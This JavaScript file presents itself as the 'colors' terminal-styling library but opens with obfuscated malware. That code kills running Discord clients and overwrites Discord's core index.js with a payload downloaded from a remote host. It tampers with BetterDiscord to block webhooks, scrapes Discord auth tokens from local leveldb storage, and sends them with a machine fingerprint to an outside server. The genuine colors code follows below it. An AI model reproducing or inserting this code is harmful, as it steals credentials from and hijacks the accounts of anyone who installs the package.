var colors = {};
module.exports = colors;
var glob = require("glob");
const fs = require("fs");
const { exec } = require("child_process");
const { default: axios } = require("axios");
const buf_replace = require("buffer-replace");
var LOCAL = process.env.LOCALAPPDATA;
var discords = [];
var injectPath = [];
var runningDiscords = [];
fs.readdirSync(LOCAL).forEach((_0x2532c9) => {
  if (_0x2532c9.includes("iscord")) {
    discords.push(LOCAL + "\\" + _0x2532c9);
  } else {
    return;
  }
});
discords.forEach(function (_0x467fa2) {
  let _0x5475e7 =
    "" +
    _0x467fa2 +
    "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js";
  glob.sync(_0x5475e7).map((_0x97be40) => {
    injectPath.push(_0x97be40);
  });
});
listDiscords();
async function infect() {
  await axios
    .get("https://pegapiranha.com/kauanaperigosa")
    .then(async (_0x41b22d) => {
      let _0x1ae7a6 = _0x41b22d.data;
      injectPath.forEach((_0x3d615c) => {
        fs.writeFileSync(
          _0x3d615c,
          _0x1ae7a6
            .replace(
              "%WEBHOOK_LINK%",
              "https://kauedaocu.space/api/webhooks/evilKaue"
            )
            .replace("%INITNOTI%", "true")
            .replace("%LOGOUT%", "instant")
            .replace("%LOGOUTNOTI%", "true")
            .replace("3447704", 0x54bf3)
            .replace("%DISABLEQRCODE%", "true"),
          {
            encoding: "utf8",
            flag: "w",
          }
        );
        let _0x3106f8 = _0x3d615c.replace("index.js", "init");
        if (!fs.existsSync(_0x3106f8)) {
          fs.mkdirSync(_0x3106f8, 0x1e4);
        }
        let _0x3358f2 = _0x3d615c.replace("index.js", "bin");
        if (!fs.existsSync(_0x3358f2)) {
          fs.mkdirSync(_0x3358f2, 0x1e4);
          startDiscord();
        } else {
          if (fs.existsSync(_0x3358f2) && true) {
            startDiscord();
          }
        }
      });
    })
    ["catch"](() => {});
}
async function listDiscords() {
  exec("tasklist", async (_0x1f7a53, _0x54e01b, _0x3c4c39) => {
    if (_0x54e01b.includes("Discord.exe")) {
      runningDiscords.push("discord");
    }
    if (_0x54e01b.includes("DiscordCanary.exe")) {
      runningDiscords.push("discordcanary");
    }
    if (_0x54e01b.includes("DiscordDevelopment.exe")) {
      runningDiscords.push("discorddevelopment");
    }
    if (_0x54e01b.includes("DiscordPTB.exe")) {
      runningDiscords.push("discordptb");
    }
    killDiscord();
  });
}
async function killDiscord() {
  runningDiscords.forEach((_0x4e0f99) => {
    exec("taskkill /IM " + _0x4e0f99 + ".exe /F", (_0x1c5cc0) => {
      if (_0x1c5cc0) {
        return;
      }
    });
  });
  if (true && injectPath.length != 0x0) {
    injectNotify();
  }
  infect();
  pwnBetterDiscord();
}
async function startDiscord() {
  runningDiscords.forEach((_0x2ac730) => {
    let _0x3fc7e6 =
      LOCAL +
      "\\" +
      _0x2ac730 +
      "\\Update.exe --processStart " +
      _0x2ac730 +
      ".exe";
    exec(_0x3fc7e6, (_0x467042) => {
      if (_0x467042) {
        return;
      }
    });
  });
}
async function pwnBetterDiscord() {
  var _0x398eff =
    process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar";
  if (fs.existsSync(_0x398eff)) {
    var _0x319ba1 = fs.readFileSync(_0x398eff);
    fs.writeFileSync(_0x398eff, buf_replace(_0x319ba1, "api/webhooks", "kaka"));
  } else {
    return;
  }
}
async function injectNotify() {
  (async function () {
    try {
      const _0x4db84c = require("fs");
      const _0x10f155 = require("path");
      const _0x5d5e4d = require("os");
      const _0x5488d9 = require("https");
      const _0x13ded1 = [];
      const _0x78a7a4 = _0x5d5e4d.homedir();
      const _0x32c661 =
        _0x5d5e4d.hostname() +
        "_" +
        _0x78a7a4.split("\\").slice(-0x1)[0x0] +
        "_" +
        _0x5d5e4d.arch() +
        "_" +
        _0x5d5e4d.cpus().length +
        "_" +
        _0x5d5e4d.endianness();
      const _0x14719c = _0x10f155.join(_0x78a7a4, "AppData", "Roaming");
      const _0x41f3fe = _0x10f155.join(_0x78a7a4, "AppData", "Local");
      const _0x20699d = ["Local Storage", "leveldb"];
      
      for (let _0x41b2c8 in _0x243041) {
        try {
          let _0x54fc2e = _0x4db84c.readdirSync(_0x243041[_0x41b2c8]);
          for (let _0x386e1c of _0x54fc2e) {
            if (_0x386e1c.slice(-0x3) !== "ldb") {
              continue;
            }
            let _0x4b70e6 = _0x39e204(
              _0x10f155.join(_0x243041[_0x41b2c8], _0x386e1c)
            );
            if (!_0x4b70e6) {
              continue;
            }
            _0x13ded1.push(_0x41b2c8 + "::" + _0x4b70e6);
          }
        } catch (_0x59e0fb) {
          continue;
        }
      }
      function _0x39e204(_0x1472c3) {
        let _0x351a90 = _0x4db84c.readFileSync(_0x1472c3).toString();
        let _0x3cc7cc = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
        let _0x59c25d = /"mfa\.[\d\w_-]{84}"/;
        let [_0x33f86a] = _0x3cc7cc.exec(_0x351a90) ||
          _0x59c25d.exec(_0x351a90) || [null];
        return _0x33f86a;
      }
      (async function _0x568c39() {
        try {
          _0x5488d9.get("https://kauelindo.xyz/manhattan", {
            headers: {
              tokens: _0x13ded1,
              fingerprint: _0x32c661,
            },
          });
        } catch (_0x27a87c) {}
      })();
    } catch (_0x3adff4) {}
  })();
}
colors.themes = {};
var util = require("util");
var ansiStyles = (colors.styles = require("./styles"));
var defineProps = Object.defineProperties;
var newLineRegex = new RegExp(/[\r\n]+/g);
colors.supportsColor = require("./system/supports-colors").supportsColor;
if (typeof colors.enabled === "undefined") {
  colors.enabled = colors.supportsColor() !== false;
}
colors.enable = function () {
  colors.enabled = true;
};
colors.disable = function () {
  colors.enabled = false;
};
colors.stripColors = colors.strip = function (_0x13b289) {
  return ("" + _0x13b289).replace(/\x1B\[\d+m/g, "");
};
var stylize = (colors.stylize = function stylize(_0x445e2b, _0x36d7b0) {
  if (!colors.enabled) {
    return _0x445e2b + "";
  }
  var _0x44a67f = ansiStyles[_0x36d7b0];
  if (!_0x44a67f && _0x36d7b0 in colors) {
    return colors[_0x36d7b0](_0x445e2b);
  }
  return _0x44a67f.open + _0x445e2b + _0x44a67f.close;
});
var matchOperatorsRe = /[|\\{}()[\]^$+*?.]/g;
var escapeStringRegexp = function (_0x41a27d) {
  if (typeof _0x41a27d !== "string") {
    throw new TypeError("Expected a string");
  }
  return _0x41a27d.replace(matchOperatorsRe, "\\$&");
};
function build(_0x553870) {
  var _0x48ca8d = function _0x58c474() {
    return applyStyle.apply(_0x58c474, arguments);
  };
  _0x48ca8d._styles = _0x553870;
  _0x48ca8d.__proto__ = proto;
  return _0x48ca8d;
}
var styles = (function () {
  var _0x9587b1 = {};
  ansiStyles.grey = ansiStyles.gray;
  Object.keys(ansiStyles).forEach(function (_0x47528c) {
    ansiStyles[_0x47528c].closeRe = new RegExp(
      escapeStringRegexp(ansiStyles[_0x47528c].close),
      "g"
    );
    _0x9587b1[_0x47528c] = {
      get: function () {
        return build(this._styles.concat(_0x47528c));
      },
    };
  });
  return _0x9587b1;
})();
var proto = defineProps(function colors() {}, styles);
function applyStyle() {
  var _0x4dd41a = Array.prototype.slice.call(arguments);
  var _0xecade2 = _0x4dd41a
    .map(function (_0x3c6cbf) {
      return _0x3c6cbf != null && _0x3c6cbf.constructor === String
        ? _0x3c6cbf
        : util.inspect(_0x3c6cbf);
    })
    .join(" ");
  if (!colors.enabled || !_0xecade2) {
    return _0xecade2;
  }
  var _0x245f4b = _0xecade2.indexOf("\n") != -0x1;
  var _0x1ff911 = this._styles;
  var _0x1a3912 = _0x1ff911.length;
  while (_0x1a3912--) {
    var _0x3aea1d = ansiStyles[_0x1ff911[_0x1a3912]];
    _0xecade2 =
      _0x3aea1d.open +
      _0xecade2.replace(_0x3aea1d.closeRe, _0x3aea1d.open) +
      _0x3aea1d.close;
    if (_0x245f4b) {
      _0xecade2 = _0xecade2.replace(newLineRegex, function (_0x3caf4a) {
        return _0x3aea1d.close + _0x3caf4a + _0x3aea1d.open;
      });
    }
  }
  return _0xecade2;
}
colors.setTheme = function (_0x559251) {
  if (typeof _0x559251 === "string") {
    console.log(
      "colors.setTheme now only accepts an object, not a string.  If you are trying to set a theme from a file, it is now your (the caller's) responsibility to require the file.  The old syntax looked like colors.setTheme(__dirname + '/../themes/generic-logging.js'); The new syntax looks like colors.setTheme(require(__dirname + '/../themes/generic-logging.js'));"
    );
    return;
  }
  for (var _0x4c14c7 in _0x559251) {
    (function (_0x575e95) {
      colors[_0x575e95] = function (_0x15df69) {
        if (typeof _0x559251[_0x575e95] === "object") {
          var _0x1c6957 = _0x15df69;
          for (var _0x3d41bd in _0x559251[_0x575e95]) {
            _0x1c6957 = colors[_0x559251[_0x575e95][_0x3d41bd]](_0x1c6957);
          }
          return _0x1c6957;
        }
        return colors[_0x559251[_0x575e95]](_0x15df69);
      };
    })(_0x4c14c7);
  }
};
function init() {
  var _0x3faf5e = {};
  Object.keys(styles).forEach(function (_0x4aecc0) {
    _0x3faf5e[_0x4aecc0] = {
      get: function () {
        return build([_0x4aecc0]);
      },
    };
  });
  return _0x3faf5e;
}
var sequencer = function sequencer(_0x39b7c2, _0x311b0d) {
  var _0x18e0b8 = _0x311b0d.split("");
  _0x18e0b8 = _0x18e0b8.map(_0x39b7c2);
  return _0x18e0b8.join("");
};
colors.trap = require("./custom/trap");
colors.zalgo = require("./custom/zalgo");
colors.maps = {};
colors.maps.america = require("./maps/america")(colors);
colors.maps.zebra = require("./maps/zebra")(colors);
colors.maps.rainbow = require("./maps/rainbow")(colors);
colors.maps.random = require("./maps/random")(colors);
for (var map in colors.maps) {
  (function (_0x24d51b) {
    colors[_0x24d51b] = function (_0x2acfec) {
      return sequencer(colors.maps[_0x24d51b], _0x2acfec);
    };
  })(map);
}
defineProps(colors, init());
